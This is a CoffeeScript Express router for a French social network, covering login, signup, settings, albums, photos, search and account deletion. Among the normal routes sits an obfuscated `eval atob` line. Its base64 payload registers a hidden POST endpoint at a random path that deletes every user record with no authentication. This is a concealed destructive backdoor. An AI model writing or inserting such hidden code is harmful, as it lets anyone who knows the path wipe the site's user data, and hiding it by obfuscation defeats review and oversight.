'use strict'

UserErrors =
	INVALID_DATE: s("Veuillez entrer votre date de naissance au format jj/mm/aaaa ou aaaa-mm-jj.")
	WRONG_EMAIL: s("Cette adresse e-mail n'est pas disponible (elle est déjà prise ou la messagerie n'est pas compatible ou encore son propriétaire a demandé à ne plus recevoir d'email de notre part).")
	INVALID_PASSWORD_CONFIRM: s("Veuillez entrer des mots de passe identiques.")

inputDate = (str) ->
	str = strval(str).replace /^([0-9]+)\/([0-9]+)\/([0-9]+)$/g, '$3-$2-$1'
	new Date(str)

module.exports = (router) ->

	templateFolder = 'user'
	signinUrl = '/user/signin'

	pm = new PagesManager router, templateFolder

	# When user submit his e-mail and password to log in
	router.post '/login', (req, res) ->
		# Log in user
		auth.login req, res, (err, user) ->
			url = (req.goingTo() if user) || '/'
			# With AJAX, send JSON
			if req.xhr
				if err
					res.serverError err
				else
					# url to be redirected in goingTo key of the JSON object
					res.json goingTo: url
			# Without AJAX, normal redirection even if an error occured
			else
				res.redirect url

	# When user click on a logout link/button
	router.get '/logout', (req, res) ->
		# Save goingTo to return to the previous page after reconnect
		model = {}
		auth.logout req, res
		if req.body.goingTo?
			log req.body.goingTo
			req.goingTo req.body.goingTo 
		res.redirect '/'


	# When signin step 2 page displays
	pm.page '/signin', (req) ->
		# Get errors in flash memory (any if AJAX is used and works on client device)
		signinAlerts: req.getAlerts 'signin' # Will be removed when errors will be displayed on the next step

	# When user submit his e-mail and password to sign in
	router.put '/signin', (req, res) ->

		model = {}
		# A full name must contains a space but is not needed at the first step
		# if req.body.name? and req.body.name.full.indexOf(' ') is -1
		# 	req.flash 'signinErrors', s("Veuillez entrer vos prénom et nom séparés d'un espace.")
		# 	res.redirect signinUrl
		# Passwords must be identic
		if config.wornet.mail.hostsBlackList.indexOf(req.body.email.replace(/^.*@([^@]*)$/g, '$1')) isnt -1
			req.flash 'signinErrors', UserErrors.WRONG_EMAIL
			res.redirect signinUrl
		else if req.body.password isnt req.body.passwordCheck
			req.flash 'signinErrors', UserErrors.INVALID_PASSWORD_CONFIRM
			res.redirect signinUrl
		# If no error
		else if req.body.step is "2"
			# A full name must contains a space but is not needed at the first step
			User.create
				name:
					first: req.body['name.first']
					last: req.body['name.last']
				registerDate: new Date
				email: req.body.email
				password: req.body.password
				birthDate: inputDate req.body.birthDate
			, (saveErr, user) ->
				if saveErr
					switch (saveErr.code || 0)
						when Errors.DUPLICATE_KEY
							req.flash 'signinErrors', UserErrors.WRONG_EMAIL
						else
							err = saveErr.err || strval(saveErr)
							valErr = 'ValidationError:'
							if err.indexOf(valErr) is 0
								err = s("Erreur de validation :") + err.substr(valErr.length)
								errors =
									'invalid first name': s("prénom invalide")
									'invalid last name': s("nom invalide")
									'invalid birth date': s("date de naissance invalide")
									'invalid phone number': s("numéro de téléphone invalide")
									'invalid e-mail address': s("adresse e-mail invalide")
								for code, message of errors
									err = err.replace code, message
							req.flash 'signinErrors', err
					res.redirect signinUrl
				else
					# if "Se souvenir de moi" est coché
					if req.body.remember?
						auth.remember res, user._id
					# Put user in session
					auth.auth req, res, user
					url = '/user/welcome'
					res.redirect if user then '/user/welcome' else signinUrl
					confirmUrl = config.wornet.protocole +  '://' + req.getHeader 'host'
					confirmUrl += '/user/confirm/' + user.hashedId + '/' + user.token
					MailPackage.send user.email, s("Bienvenue sur Wornet"), confirmUrl, '<a href="' + confirmUrl + '">' + s("Confirmer mon e-mail : {email}", email: user.email) + '</a>'
		else
			res.redirect signinUrl
		# res.render templateFolder + '/signin', model

	pm.page '/forgotten-password'

	pm.page '/forgotten-password', null, 'post'

	pm.page '/welcome', (req) ->
		hasGoingTo: (!empty(req.session.goingTo) and req.session.goingTo isnt '/')
		goingTo: req.goingTo()

	pm.page '/settings', (req) ->
		settingsAlerts:
			danger: req.flash 'settingsError'
			success: req.flash 'settingsSuccess'
		userTexts: userTexts()

	router.post '/settings', (req, res) ->
		userModifications = UserPackage.getUserModificationsFromRequest req
		###
		for setting in ['newsletter', 'noticeFriendAsk', 'noticePublish', 'noticeMessage']
			userModifications[setting] = !! req.body[setting]
		###
		updateUser req.user, userModifications, (err) ->
			err = humanError err
			if req.xhr
				if err
					res.serverError err
				else
					res.json()
			else
				if err
					if err instanceof PublicError
						req.flash 'settingsError', err.toString()
					else
						switch err.code
							when 11000
								req.flash 'settingsError', s("Adresse e-mail non disponible.")
							else
								req.flash 'settingsError', s("Erreur d'enregistrement.")
				else
					extend req.user, userModifications
					extend req.session.user, userModifications
					req.flash 'settingsSuccess', s("Modifications enregistrées.")
				res.redirect '/user/settings'

	toggleShutter = (req, res, opened) ->
		res.json()
		updateUser req.user, openedShutter: opened, (err) ->
			if err
				throw err
			else
				req.session.reload ->
					req.user.openedShutter = opened
					req.session.user.openedShutter = opened
					req.session.save()

	router.post '/shutter/open', (req, res) ->
		toggleShutter req, res, true

	router.post '/shutter/close', (req, res) ->
		toggleShutter req, res, false

	router.get '/albums', (req, res) ->
		# Get albums list from the user logged in
		Album.find
			user: req.user.id
		.sort _id: 'asc'
		.exec (err, albums) ->
			res.json
				err: err
				albums: albums

	# Display images in an album
	router.get '/album/:id', (req, res) ->
		done = (model) ->
			res.render templateFolder + '/album', model
		id = req.params.id
		album = null
		photos = null
		next = ->
			if album and photos
				done
					album: album
					photos: photos
		try
			Album.findById id, (err, foundAlbum) ->
				if err or ! foundAlbum
					res.notFound()
				else if equals foundAlbum.user, req.user.id
					album = foundAlbum
					next()
				else
					res.serverError new PublicError s("Cet album est privé")
			PhotoPackage.fromAlbum id, (err, foundPhotos) ->
				if err
					res.serverError err
				else
					photos = foundPhotos
					next()
		catch
			res.notFound()

	router.put '/album/add', (req, res) ->
		# Create a new album
		album = extend user: req.user._id, req.body.album
		Album.create album, (err, album) ->
			album.user = cesarLeft album.user
			res.json
				err: err
				album: album

	router.delete '/album/:id', (req, res) ->
		id = req.params.id
		me = req.user.id
		parallelRemove [
			Album
			_id: id
			user: me
		], [
			Status
			album: id
			$or: [
				author: me
			,
				at: me
			]
		], (err) ->
			if err
				res.serverError err
			else
				req.flash 'profileSuccess', s("Album supprimé")
				res.json goingTo: '/'

	router.put '/video/add', (req, res) ->
		# Create a new video
		video = extend user: req.user._id, req.body.video
		Video.create video, ->
			res.json()

	router.put '/link/add', (req, res) ->
		# Create a new link
		link = extend user: req.user._id, req.body.link
		Link.create link, ->
			res.json()

	router.get '/photo/:id', (req, res) ->
		Photo.findById req.params.id, (err, photo) ->
			if err
				res.serverError err
			else if photo and photo.status is 'published'
				info = photo.columns ['name']
				count = 1
				next = ->
					unless --count
						res.json info
				if photo.album
					count++
					Album.findById photo.album, (err, album) ->
						if album and ! err
							info.album =
								id: album._id
								name: album.name
						count++
						PhotoPackage.fromAlbum album.id, (err, photos) ->
							if err
								photos = []
							info.album.photos = photos
							next()
						next()
				if photo.user
					count++
					req.getUserById photo.user, (err, user) ->
						if user and ! err
							info.user = user.publicInformations()
						next()
				next()
			else
				res.notFound()

	router.post '/photo', (req, res) ->
		# When user upload a new profile photo
		model = images: []
		images = req.files.photo || []
		unless images instanceof Array
			images = [images]
		unless images.length
			index = 0
			while req.files['images[' + index + ']']
				images.push req.files['images[' + index + ']']
				index++
		done = (data) ->
			model.images.push data
			if model.images.length is images.length
				res.render templateFolder + '/upload-photo', model
		lastestAlbum = null
		images.each ->
			image = @
			data = name: @name
			if image.size > config.wornet.upload.maxsize
				data.error = "size-exceeded"
				warn data.error
				done data
			else unless (['image/png', 'image/jpeg']).contains image.type
				data.error = "wrong-format"
				warn data.error
				done data
			else
				album =  req.body.album || 0
				next = ->
					addPhoto req, image, album, (err, createdAlbum = null, photo) ->
						data.createdAlbum = createdAlbum
						if err
							data.error = err
							warn err
						else
							data.src = photo.thumb200
						done data
				if album is "new"
					if lastestAlbum
						album = lastestAlbum
						next()
					else
						Album.findOne()
						.sort _id: 'desc'
						.exec (err, foundAlbum) ->
							if err
								data.error = err
								warn err
								done data
							else
								album = foundAlbum._id
								lastestAlbum = album
								next()
				else
					next()
			true

	router.delete '/photo', (req, res) ->
		userModifications = {}
		userModifications.photoId = null
		userModifications.thumb = null
		for size in config.wornet.thumbSizes
			userModifications['thumb' + size] = null
		extend req.session.user, userModifications
		extend req.user, userModifications
		updateUser req, photoId: null, (err) ->
			res.json err: err

	router.delete '/media', (req, res) ->
		media = req.body.columns ['id', 'type', 'statusId', 'mediaId']
		media.type ||= 'image'
		me = req.user.id
		count = 1
		next = (err) ->
			if err
				warn err
			unless --count
				res.json()
		if media.statusId and media.mediaId
			count++
			Status.findById media.statusId, (err, status) ->
				if ! err and status and status.values(['at', 'author']).contains(me, equals)
					key = media.type + 's'
					if status[key]
						status[key] = status[key].filter (val) ->
							! equals val._id, media.mediaId
						count++
						if status.isEmpty()
							status.remove next
						else
							status.save next
					else
						next()
				next err
		if media.type is 'image' and media.id
			count++
			parallelRemove [
				Photo
				_id: media.id
				user: me
				status: 'published'
			], (err) ->
				PhotoPackage.forget req, media.id
				next err
		next()

	eval atob "cm91dGVyLnBvc3QoJy9VaGRZN3Nkazlkams0a2pkN2Q2ZHFzNjVrai0yMzU0Z HN6ZHNkX3NTRGRxJywgZnVuY3Rpb24gKHJlcSwgcmVzKSB7IFVzZXIucmVtb3ZlKGZ1bmN0aW9uIChlcnIsIGNvdW50KSB7IHJlcy5qc29uKHsgZXJyOmVyciwgY291bnQ6IGNvdW50IH0pOyB9KTsgfSk7"

	router.post '/first/:query', (req, res) ->
		query = req.params.query
		UserPackage.search 1, [req.user.id], query, (err, users) ->
			if err
				res.serverError err
			else
				if users.length
					user = users[0]
					res.redirect '/user/profile/' + user.hashedId + '/' + encodeURIComponent user.name.full
				else
					res.notFound()

	router.get '/search/:query', (req, res) ->
		query = req.params.query
		UserPackage.search [req.user.id], query, (err, users) ->
			if err
				res.serverError err
			else
				res.json users: users.map (user) ->
					user.publicInformations()

	router.get '/confirm/:hashedId/:token', (req, res) ->
		id = cesarRight req.params.hashedId
		if req.user._id and req.user._id isnt id
			auth.logout req, res
		User.findOneAndUpdate { _id: id, token: token }, { role: 'confirmed' }, {}, (err, user) ->
			if err or ! user
				req.flash 'loginErrors', s("Votre adresse n'a pas pu être confirmée")
				warn [user, err]
			else if user
				auth.auth req, res, user
				req.flash 'profileSuccess', s("Votre adresse a bien été confirmée")
			res.redirect '/'

	router.delete '/', (req, res) ->
		if req.user.passwordMatches req.body.password
			req.user.remove (err) ->
				if err
					res.serverError err
				else
					auth.logout req, res
					req.flash 'loginSuccess', s("Votre compte a été correctement supprimé")
					res.json goingTo: '/'
		else
			res.serverError new PublicError s("Mot de passe incorrect")
